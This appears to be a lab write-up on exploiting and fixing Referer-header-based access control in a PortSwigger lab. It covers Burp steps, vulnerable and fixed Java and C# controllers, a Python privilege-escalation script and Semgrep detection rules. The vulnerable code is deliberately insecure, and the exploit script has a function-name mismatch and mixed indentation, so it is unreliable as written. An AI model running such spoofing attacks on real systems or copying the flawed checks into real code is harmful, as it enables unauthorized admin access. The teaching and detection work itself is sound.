---
title: "Lab 13: Referer-based access control"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [referrer-based_access_control] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab11_access_control/
---

## 1. Executive Summary

**Vulnerability:** Broken Access Control (Insecure Header Validation).

**Description:** The application attempts to verify authorization by checking the HTTP `Referer` header. It assumes that if a request originated from the "Admin Panel" page (e.g., `/admin`), the user must be an administrator.

**Impact:** Privilege Escalation. Since the `Referer` header is set by the client browser, an attacker can easily spoof this value using a proxy (like Burp Suite) or a command-line tool, bypassing the access control check entirely.

## 2. The Attack

**Objective:** Promote the user `wiener` to administrator by spoofing the source of the request.

1. **Baselining (Admin):** I logged in as `administrator`. I promoted `carlos` and captured the request in Burp Suite.
    - **Request:** `GET /admin-roles?username=carlos&action=upgrade`
    - **Header:** `Referer: https://.../admin`
2. **Testing (User):** I logged in as `wiener`. I tried to visit the upgrade URL directly in the browser address bar.
    - **Result:** `401 Unauthorized`. The error message indicated "Invalid Referer" (or similar behavior implying the check failed).
3. **Exploitation:** I sent the Admin's captured request to **Repeater**.
    - I replaced the **Session Cookie** with `wiener`'s cookie.
    - I changed the **Username** parameter to `wiener`.
    - **Crucially**, I left the `Referer` header exactly as it was (`/admin`).
4. **Result:** The server returned `200 OK` (or `302 Found`). The backend saw the valid Referer header and assumed the request was legitimate, upgrading my user.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The code relies on the HTTP `Referer` header to decide if a user is allowed to perform an action.

- **The Flaw:** The `Referer` header is not a security token. It is a piece of metadata sent by the browser. It is fully controllable by the user.
- **The Reality:** The server is enforcing "Navigation Flow" (you must come from Page A to go to Page B), not "Access Control" (do you have permission to access Page B?).

### Java (Spring Boot)

```java
@Controller
public class AdminController {

    // VULNERABLE: Checks if the request came from the admin panel URL.
    @GetMapping("/admin-roles")
    public String upgradeUser(HttpServletRequest request, @RequestParam String username) {
        
        String referer = request.getHeader("Referer");
        
        // FLAWED LOGIC: Trusting the client header
        if (referer != null && referer.contains("/admin")) {
            userService.grantAdmin(username);
            return "redirect:/admin";
        } else {
            return "error_unauthorized";
        }
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`request.getHeader("Referer")`**: Retrieves the string value of the Referer header from the incoming HTTP request.
- **`referer.contains("/admin")`**: The code performs a simple string check. If the string `/admin` appears anywhere in the Referer, it allows the sensitive operation.
- **Bypass**: An attacker simply adds `Referer: https://evil.com/admin` or keeps the original `Referer: https://site.com/admin` manually. The `userService.grantAdmin` method executes because the `if` condition evaluates to true.

### C# (ASP.NET Core)

```csharp
public class AdminController : Controller
{
    // VULNERABLE
    public IActionResult UpgradeUser(string username)
    {
        // 1. Read the header
        var referer = Request.Headers["Referer"].ToString();

        // 2. Validation check based on origin
        if (!string.IsNullOrEmpty(referer) && referer.Contains("/admin"))
        {
            _userService.SetRole(username, "Admin");
            return RedirectToAction("Index");
        }

        return Unauthorized("Access denied: Invalid Referer");
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`Request.Headers["Referer"]`**: Accesses the headers dictionary.
- **`Contains("/admin")`**: Checks if the spoofed string is present.
- **The Gap**: There is zero check of `User.IsInRole("Admin")`. The code assumes the only way to generate a Referer of `/admin` is to actually *be* on the admin page (which only admins can see). This assumption is false because tools like Burp Suite can generate any header.

### Mock PR Comment

The `upgradeUser` method authorizes requests based solely on the `Referer` header. This header is client-controlled and can be easily spoofed by an attacker to bypass security.

**Recommendation:** Remove the Referer check entirely or use it only for analytics/logging. Implement a proper Role-Based Access Control (RBAC) check (e.g., `@PreAuthorize` or `[Authorize]`) to ensure the session belongs to an administrator.

## 4. The Fix

**Explanation of the Fix:**
We remove the header check. We replace it with a Session/Role check. We don't care where the user came from; we care **who** they are.

### Secure Java

```java
@Controller
public class AdminController {

    // SECURE: We check the User's Authority in the Session.
    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping("/admin-roles")
    public String upgradeUser(@RequestParam String username) {
        
        // Logic runs only if the user has the ADMIN role.
        userService.grantAdmin(username);
        return "redirect:/admin";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@PreAuthorize`**: This annotation triggers the Spring Security interceptor.
- **Execution**: Before `upgradeUser` runs, the framework inspects the user's Session context. If the user is `wiener` (Role: USER), the framework throws a `AccessDeniedException` immediately. The header `Referer` is completely ignored.

### Secure C#

```csharp
[Authorize(Roles = "Admin")] // SECURE: Strict Role Check
public class AdminController : Controller
{
    public IActionResult UpgradeUser(string username)
    {
        // Code here is unreachable by non-admins.
        _userService.SetRole(username, "Admin");
        return RedirectToAction("Index");
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`[Authorize(Roles = "Admin")]`**: The .NET Middleware checks the ClaimsPrincipal associated with the request.
- **Tamper-Proof**: Unlike headers, the ClaimsPrincipal is built from an encrypted Authentication Cookie or JWT that the user cannot modify without the server's secret key.

## 5. Automation

*A Python script that sends a request with the spoofed Referer header.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_referer_header(url, session_cookie, my_username):
	target_path = "/admin-roles"
	params = {
        "username": my_username,
        "action": "upgrade"
    }
    cookies = {"session": session_cookie}
    
    # CRITICAL: We manually set the Referer header to match the admin panel URL.
    # The backend checks if this header contains "/admin" (or the full URL).
    headers = {
        "Referer": f"{url.rstrip('/')}/admin"
    }

    print(f"[*] Target: {url}{target_path}")
    print(f"[*] Spoofing Referer: {headers['Referer']}")
    print(f"[*] Promoting user: {my_username}")

    try:
        resp = requests.get(
            f"{url.rstrip('/')}{target_path}", 
            params=params, 
            cookies=cookies, 
            headers=headers, # Injecting the header here
            timeout=10
        )
        
        print(f"[*] Status Code: {resp.status_code}")
        
        # Verify success
        # Usually 200 OK or 302 Redirect indicates success. 401/403 is failure.
        if resp.status_code in [200, 302]:
            print("[+] Request accepted. Referer bypass successful.")
        elif resp.status_code == 401:
            print("[-] 401 Unauthorized. The Referer check might have failed (check URL syntax).")
        else:
            print(f"[-] Unexpected response: {resp.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    ap = argparse.ArgumentParser(description="Exploit Referer-based Access Control")
    ap.add_argument("url", help="Base URL of the lab")
    ap.add_argument("session", help="Your valid session cookie")
    ap.add_argument("username", help="Your username to promote (e.g., wiener)")
    
    args = ap.parse_args()
    exploit_referer_bypass(args.url, args.session, args.username)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect code that reads the `Referer` header and uses it inside conditional logic (`if`), suggesting it's being used for a security decision.*

**The Logic**
We want to flag code that:

1. Retrieves the "Referer" header.
2. Stores it in a variable.
3. Uses that variable in an `if` statement.

### Java Rule

```yaml
rules:
  - id: java-insecure-referer-check
    languages: [java]
    message: |
      Detected usage of 'Referer' header in conditional logic. 
      Do not rely on the Referer header for access control or security decisions 
      as it can be spoofed.
    severity: WARNING
    patterns:
      - pattern-inside: |
          $METHOD(...) {
            ...
            String $REF = $REQ.getHeader("Referer");
            ...
          }
      - pattern: |
          if ($REF.contains(...)) { ... }
```

### C# Rule

```yaml
rules:
  - id: csharp-insecure-referer-check
    languages: [csharp]
    message: "Potential security check using Referer header. Use [Authorize] instead."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public $RET $METHOD(...) { ... }
      - pattern: |
          if ($CTX.Request.Headers["Referer"].ToString().Contains(...)) { ... }
```
